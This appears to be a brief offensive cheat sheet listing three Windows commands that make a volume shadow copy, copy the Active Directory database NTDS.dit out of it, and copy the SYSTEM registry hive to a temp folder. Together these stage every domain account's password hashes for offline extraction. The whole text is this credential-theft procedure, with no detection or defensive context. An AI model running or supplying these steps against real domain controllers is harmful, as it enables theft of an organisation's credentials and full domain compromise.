### Create shadow copy of ntds.dit
```
vssadmin create shadow /for=C:
```

### Copy shadow copy
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<id>\Windows\NTDS\NTDS.dit C:\temp\<ntds>.dit
```

### Copy system hive
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<id>\Windows\System32\config\SYSTEM C:\temp\system.hive
```

